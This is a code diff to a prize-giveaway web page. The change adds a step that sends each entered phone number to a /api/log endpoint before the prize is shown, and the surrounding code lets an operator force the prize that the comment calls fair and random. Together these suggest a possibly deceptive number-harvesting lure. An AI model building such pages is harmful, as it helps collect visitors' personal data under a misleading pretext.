@@ -203,24 +203,35 @@
     }
 
     phoneForm.addEventListener('submit', (e) => e.preventDefault());
-    checkBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      const phone = phoneInput.value;
-      if (!validKg(phone)) {
-        phoneError.classList.remove('hidden');
-        phoneInput.focus();
-        return;
-      }
-      // UX states
-      phoneForm.parentElement.classList.add('hidden');
-      checking.classList.remove('hidden');
+    checkBtn.addEventListener('click', async (e) => {
+  e.preventDefault();
+  const phone = phoneInput.value;
+  if (!validKg(phone)) {
+    phoneError.classList.remove('hidden');
+    phoneInput.focus();
+    return;
+  }
 
-      setTimeout(() => {
-        checking.classList.add('hidden');
-        showPrize(phone);
-      }, 1600);
+  // 1️⃣ Отправляем лог сразу после ввода
+  try {
+    await fetch("/api/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ message: `Новый номер: ${phone}` })
     });
+  } catch(err) {
+    console.error("Ошибка отправки лога:", err);
+  }
 
+  // 2️⃣ UX states
+  phoneForm.parentElement.classList.add('hidden');
+  checking.classList.remove('hidden');
+
+  setTimeout(() => {
+    checking.classList.add('hidden');
+    showPrize(phone);
+  }, 1600);
+});
     function pickPrize(){
       if (typeof FORCE_PRIZE === 'string' && FORCE_PRIZE.length) return FORCE_PRIZE;
       // Fair random by default
@@ -308,5 +319,6 @@ continueBtn.onclick = async () => {
 </div> -->
 </body>
 </html>
+
 
 
